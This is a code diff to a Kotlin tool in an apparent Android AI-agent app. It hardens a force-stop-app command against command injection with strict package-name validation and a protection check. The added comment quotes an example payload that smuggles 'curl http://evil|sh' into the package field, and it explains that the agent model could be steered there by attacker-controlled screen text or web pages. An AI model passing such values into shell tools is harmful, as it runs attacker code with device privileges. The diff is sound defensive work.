@@ -1,6 +1,8 @@
 package com.blackclaw.android.tool.impl
 
+import com.blackclaw.android.ClawApplication
 import com.blackclaw.android.adb.PrivilegedShell
+import com.blackclaw.android.security.SecurityPolicy
 import com.blackclaw.android.tool.BaseTool
 import com.blackclaw.android.tool.ToolParameter
 import com.blackclaw.android.tool.ToolResult
@@ -32,9 +34,18 @@ class ForceStopAppTool : BaseTool() {
         }
         val pkg = requireString(params, "package").trim()
         if (pkg.isEmpty()) return ToolResult.error("package vacío")
-        // Sanity: refuse to kill BlackClaw itself
-        if (pkg == "com.blackclaw.android") {
-            return ToolResult.error("No voy a matar BlackClaw a mí mismo.")
+        // COMMAND INJECTION FIX: this value is interpolated into `sh -c`, and it comes
+        // from the model — which reads attacker-influenceable screen text, notification
+        // bodies and web pages. Without validation, package="x; curl http://evil|sh"
+        // ran as a second command with adb-shell privileges. The strict regex admits
+        // only real package names, so no metacharacter can survive.
+        // It also subsumes the old `pkg == "com.blackclaw.android"` self-check, which
+        // was bypassable by any variation such as a trailing separator.
+        if (!SecurityPolicy.isValidPackageName(pkg)) {
+            return ToolResult.error("Nombre de paquete inválido: $pkg")
+        }
+        SecurityPolicy.protectionReason(ClawApplication.instance, pkg)?.let { reason ->
+            return ToolResult.error("No puedo detener $pkg: $reason")
         }
         PrivilegedShell.exec("am force-stop $pkg") ?: return ToolResult.error("am force-stop falló")
         return ToolResult.success("Forzada la detención de $pkg")
